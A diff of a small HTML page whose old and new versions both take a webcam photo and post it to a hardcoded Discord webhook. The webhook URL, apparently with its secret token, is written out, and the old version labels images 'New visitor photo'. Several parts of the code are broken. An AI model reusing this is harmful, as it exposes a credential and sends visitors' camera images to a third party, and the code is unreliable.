@@ -1,63 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Photo Capture</title>
-    <script>
-        function capturePhoto() {
-            // Create a new image element
-            var img = new Image();
-
-            // Set the source of the image to the user's webcam
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function (stream) {
-                    img.srcObject = stream;
-                    document.body.appendChild(img);
-                })
-                .catch(function (error) {
-                    console.log('Error accessing webcam:', error);
-                });
-        }
-
-        function sendPhoto() {
-            // Get the captured photo from the image element
-            var img = document.querySelector('img');
-
-            // Convert the image to base64 data URL
-            var canvas = document.createElement('canvas');
-            var context = canvas.getContext('2d');
-            context.drawImage(img, 0, 0);
-            var dataUrl = canvas.toDataURL();
-
-            // Send the photo via Discord webhook
-            var webhookUrl = 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX';
-            var payload = {
-                content: 'New visitor photo',
-                embeds: [{
-                    image: {
-                        url: dataUrl
-                    }
-                }]
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-                .then(function (response) {
-                    console.log('Photo sent successfully');
-                })
-                .catch(function (error) {
-                    console.log('Error sending photo:', error);
-                });
-        }
-    </script>
+ <title>Automatic Photo Taker</title>
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <h1>Welcome to Auto Photo Capture</h1>
-    <button onclick="capturePhoto()">Capture Photo</button>
-    <button onclick="sendPhoto()">Send Photo</button>
+ <h1>Welcome to the Automatic Photo Taker!</h1>
+ <p>Please allow the website to access your camera to take a photo.</p>
+ <div id="photoContainer"></div>
+ <button id="captureBtn">Capture Photo</button>
+ <button id="sendBtn">Send Photo</button>
+
+ <script>
+    // Get the video element from the DOM
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    const captureButton = document.getElementById('captureBtn');
+    const sendButton = document.getElementById('sendBtn');
+    const photoContainer = document.getElementById('photoContainer');
+
+    // Get a permission from the user to use the camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+      });
+
+    // Capture a photo when the "Capture Photo" button is clicked
+    captureButton.addEventListener('click', () => {
+      context.drawImage(video, 0, 0, 640, 480);
+      const image = canvas.toDataURL('image/png');
+      photoContainer.innerHTML = `<img src="${image}" alt="Captured Photo">`;
+    });
+
+    // Send the captured photo to the Discord webhook when the "Send Photo" button is clicked
+    sendButton.addEventListener('click', () => {
+      const webhookURL = 'https://discord.com/api/webhooks/1187545279960981535/Zy3DgtGfbw7TLCo5H6jQKp1ZQ_5EHf-vhsG4X7ZRqlPZrdQ0mmuLBOVgCoCOgmawzjYX';
+      const photo = photoContainer.querySelector('img');
+
+      if (photo) {
+        $.ajax({
+          url: webhookURL,
+          type: 'POST',
+          data: {
+            content: 'Here is the captured photo:',
+            file: photo.src
+          },
+          processData: false,
+          contentType: false
+        });
+      } else {
+        alert('Please capture a photo first.');
+      }
+    });
+ </script>
 </body>
 </html>
